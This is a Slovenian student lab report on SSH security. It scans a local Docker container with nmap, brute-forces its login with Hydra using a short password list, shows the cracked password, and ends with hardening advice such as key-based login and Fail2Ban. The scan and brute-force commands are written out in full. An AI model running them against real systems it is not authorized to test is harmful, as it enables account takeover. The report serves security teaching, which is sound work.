# Lab 09 - Testiranje SSH varnosti z Nmap in Hydra

## Priprava okolja

### Docker SSH streznik
```bash
docker build -t dvws .
sudo docker run -d -p 2222:22 --name dvws-ssh dvws
```

### IP naslov containerja
```bash
sudo docker inspect dvws-ssh | grep IPAddress
# 172.17.0.2
```

## Nmap skeniranje

### Ukaz
```bash
nmap -sS -sV -O -p- 172.17.0.2
```

### Rezultati
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

OS: Linux 4.X|5.X
```

**Ugotovitve:**
- Odprta vrata: 22 (SSH)
- Storitev: OpenSSH 8.9p1
- OS: Ubuntu Linux

## Hydra brute-force napad

### Seznam gesel (passwords.txt)
```
password
123456
test123
admin
```

### Ukaz
```bash
hydra -l testuser -P passwords.txt -s 22 172.17.0.2 ssh
```

### Rezultati
```
Hydra v9.6 starting at 2026-01-04 01:53:11
[WARNING] Many SSH configurations limit the number of parallel tasks
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: testuser   password: test123
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-01-04 01:53:14
```

**Geslo najdeno v 3 sekundah!**

## Analiza

### Zakaj so sibka gesla nevarna?
Sibka gesla napadalcem omogocajo bliskovit vdor z avtomatiziranimi orodji (kot je Hydra). Geslo "test123" je bilo najdeno v 3 sekundah.

### Zakaj zapirati neuporabljene porte?
Neuporabljeni odprti porti delujejo kot nezavarovani vhodi, skozi katere lahko napadalci vdrejo v sistem. Vsaka odprta storitev poveca povrsino za napad.

## Zascita SSH streznika

### Priporoceni ukrepi
1. **Onemogocanje prijave z geslom** - uporaba javno-zasebnih kljucev
2. **Fail2Ban** - avtomatsko blokiranje IP po neuspelih poskusih
3. **Sprememba privzetega porta** - zmanjsa avtomatizirano skeniranje
4. **Firewall** - omejitev dostopa samo na zaupane IP naslove
5. **Rate limiting** - omejitev stevila poskusov prijave

### Ucinek mocnega gesla
Zelo mocno geslo matematicno prepreci vdor z brute-force napadom, vendar:
- Streznik se vedno obdeluje promet napadov
- Boljsa resitev je onemogocanje gesla in uporaba SSH kljucev
